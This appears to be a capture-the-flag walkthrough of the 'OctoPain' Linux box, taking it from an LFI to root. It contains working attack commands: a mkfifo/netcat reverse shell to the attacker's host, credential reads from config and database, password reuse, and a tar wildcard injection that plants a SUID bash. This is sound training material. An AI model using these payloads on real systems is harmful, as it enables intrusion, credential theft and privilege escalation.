# OctoPain — Solution Walkthrough

**Event:** NexSec Final · Boot2Root Day 1 · Student Track
**Box:** OctoPain (Linux, Easy) · hostname `octopus.garden`
**Full chain:** anonymous -> www-data -> inkling -> root

> Set `TARGET` to your team's box IP (ours was `10.0.27.66`; it differs per team).
> Set `LHOST` to your VPN IP (your `tun0`, e.g. `ip a show tun0`).

| Stage | Technique |
|-------|-----------|
| Recon | Full port scan + vhost discovery |
| Initial access | php2shell: `session.upload_progress` UAF + LFI session include (CVE-2026-109618 / -109619) |
| Lateral movement | DB credential leak -> password reuse -> `su inkling` |
| Privilege escalation | tar wildcard injection via a root cron job |

---

## Lesson that cost us hours

The app runs on **port 18080**, not port 80. A default `nmap -sC -sV` only covers
the top 1000 ports and misses it, so port 80 (a decoy that always returns 403) looks
like the whole web surface. **Always run a full port scan first:**

```bash
nmap -p- --min-rate 1000 TARGET        # finds 22, 80, 18080
nmap -p18080 -sC -sV TARGET
```

- Port 80 -> always 403 (decoy, ignore it)
- Port 18080 -> 403 on the bare IP, serves the wiki only with the right `Host` header
- Port 22 -> SSH (used later with reused creds)

---

## Stage 0 — Recon

### Vhost discovery (on 18080, not 80)

```bash
ffuf -u http://TARGET:18080/ -H "Host: FUZZ.garden" \
     -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fc 403
```

The wiki answers to `Host: octopus.garden`. Add it and load it:

```bash
echo "TARGET octopus.garden" | sudo tee -a /etc/hosts
curl -s http://octopus.garden:18080/        # The Octopus Garden wiki loads
```

### phpinfo breadcrumb

```
http://octopus.garden:18080/info.php
```

Reveals the whole initial-access path:
- PHP 8.4.x (before the 8.4.27 fix)
- `session.upload_progress.enabled = On`
- `session.save_path = /var/lib/php/sessions`

---

## Stage 1 — LFI discovery

The `?view=` parameter feeds straight into `include()`:

```
http://octopus.garden:18080/?view=/etc/passwd
```

Arbitrary file include confirmed. But every classic LFI-to-RCE wrapper is blocked
(returns "off the reef"):

```
?view=php://input            -> blocked
?view=php://filter/...       -> blocked
?view=data://text/plain,...  -> blocked
?view=/var/log/nginx/...     -> blocked
?view=/proc/self/environ     -> blocked
```

Chasing traditional LFI2RCE here is a red herring. What is **not** blocked is the
PHP session directory:

```
?view=/var/lib/php/sessions/sess_test
# "No such article" (file missing, but no denylist hit) -> session include is the way
```

---

## Stage 2 — RCE via php2shell (session.upload_progress UAF)

PHP's `session.upload_progress` has a heap use-after-free. During a stalled multipart
upload the rfc1867 callback caches `zval*` pointers into the session HashTable. When
the upload stalls past `min_freq` (1s) the session re-initialises and frees the
HashTable, but the cached pointers stay live, so the next `FILE_DATA` chunk writes
through stale pointers. This poisons the session file with attacker PHP that survives
`upload_progress.cleanup`. Include the poisoned session file through the LFI to execute.

**Tool:** `github.com/syrex1013/php2shell` (reference only — review before running)

```bash
git clone https://github.com/syrex1013/php2shell
cd php2shell

# session+LFI mode: LFI param is 'view', sessions at /var/lib/php/sessions/
python3 poc.py http://octopus.garden:18080/index.php "id" --lfi-param view
```

Expected:
```
[+] RCE confirmed via session+LFI
COMMAND OUTPUT: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Reverse shell (listener `nc -lvnp 9001` on your box first):
```bash
python3 poc.py http://octopus.garden:18080/index.php \
  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST 9001 >/tmp/f" \
  --lfi-param view -i
```

---

## Stage 3 — www-data -> inkling (credential reuse)

### 3a. Leak DB credentials

```bash
cat /var/www/octopain/config/secrets.php
# DB_USER = inkwiki  /  DB_PASS = r3ef-r3ader-only
```

### 3b. Query the database

```bash
mysql -h127.0.0.1 -uinkwiki -p'r3ef-r3ader-only' octopain \
  -e "SELECT skey, sval, note FROM settings;"
```

```
maintenance_user | inkling               | ssh / shell account
maintenance_pass | Ink1ing_Gr0tto_2025!  | TODO: stop reusing this everywhere
backup_path      | /var/backups/octopain/| nightly dump lives here
```

### 3c. Pivot

```bash
su inkling          # password: the maintenance_pass above
cat /home/inkling/user.txt
```

> Note: the dump listed `..._2025!` but the account actually took `Ink1ing_Gr0tto_2026!`.
> If one fails, try the other year — the box reused the password with a year bump.

**User flag obtained.**

---

## Stage 4 — inkling -> root (tar wildcard injection)

### 4a. Find the cron job

```bash
cat /etc/cron.d/ink-backup
# */2 * * * * root /opt/octopain/ink-backup.sh >> /var/log/ink-backup.log 2>&1

cat /opt/octopain/ink-backup.sh
# cd /var/www/octopain && /usr/bin/tar czf ... *
```

It runs as **root every 2 minutes**, `cd`s into `/var/www/octopain`, and runs
`tar czf ... *`. The `*` glob expands filenames, including names that look like tar flags.

### 4b. Confirm write access

```bash
id    # inkling is in the www-data group; /var/www/octopain is group-writable
touch /var/www/octopain/testwrite && rm /var/www/octopain/testwrite
```

### 4c. Plant the payload and the flag-named files

```bash
cat > /var/www/octopain/pwn.sh << 'SHELL'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod u+s /tmp/rootbash
SHELL
chmod +x /var/www/octopain/pwn.sh

cd /var/www/octopain
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh pwn.sh'
```

When the cron fires, the glob expands to:
```
tar czf ... --checkpoint=1 --checkpoint-action=exec=sh pwn.sh config public ...
```
tar reads those as real flags and runs `sh pwn.sh` as root at checkpoint 1.

### 4d. Wait and collect

```bash
sleep 120
ls -la /tmp/rootbash         # -rwsr-xr-x root root
/tmp/rootbash -p             # root shell
cat /root/root.txt
```

**Root flag obtained.**

---

## Breadcrumbs summary

| Location | Hint |
|----------|------|
| Port 80 -> 403 | decoy, keep looking (and full-scan ports) |
| Port 18080 + wrong Host -> 403 | vhost-based filtering |
| `info.php` | PHP 8.4 + `session.upload_progress = On` |
| `?view=/etc/passwd` works | LFI confirmed |
| all wrappers blocked | not LFI2RCE, think differently |
| session path not blocked | session include is the path |
| blue-ringed article | italicised "progress", "uploaded", "session" |
| blue-ringed field note | inkling reuses passwords; backup mentioned |
| about page | PHP 8.4, upload progress, cron backups, inkling has write access |
| `/var/backups/octopain/README.txt` | points to DB `settings` table for creds |
| `/etc/cron.d/ink-backup` | readable cron, reveals the tar wildcard |
| `/opt/octopain/ink-backup.sh` | world-readable, shows `tar ... *` |
